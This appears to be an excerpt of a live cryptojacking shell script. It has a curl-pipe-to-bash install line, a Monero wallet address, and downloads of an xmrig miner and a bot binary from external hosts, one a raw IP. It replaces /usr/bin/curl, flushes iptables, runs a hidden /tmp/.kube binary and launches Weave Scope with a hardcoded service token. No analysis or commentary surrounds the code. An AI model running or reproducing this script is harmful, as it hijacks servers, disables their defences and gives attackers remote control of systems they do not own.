...
# curl -Lk http://chimaera.cc/sh/mo.sh | bash

if [ "$(hostname)" = "HaXXoRsMoPPeD" ]; then exit ; fi

if [ -d "/usr/bin/moneroocean/" ];then exit ; fi
...
WALLET="85HgMCkoDiP4LQ1XN5dQ7k73h6WX3pZn3BG4K5a5YdwxiSxcJWe6JoH9jHtiLtPbYCQqzYLPyQkEBRkjSVUc1HjjDT8jJ3D"

XMR1BIN="http://chimaera.cc/bin/xmrig.tar.gz"
...
DLOAD http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../curl/x86_64 > /usr/bin/curl
...
if [ ! -f "/tmp/.kube" ];then iptables -F ;curl -sLk http://chimaera.cc/bin/KBot/x86_64 -o /tmp/.kube;mount -o remount,exec /tmp 2>/dev/null 1>/dev/null;chmod +x /tmp/.kube 2>/dev/null 1>/dev/null;cd /tmp/ 2>/dev/null 1>/dev/null;./.kube 2>/dev/null 1>/dev/null;fi
...
#/usr/bin/scope stop
/usr/bin/scope launch --service-token=d1m9gbsc5dog38bgcf9w7oz6it1tpk8s
fi
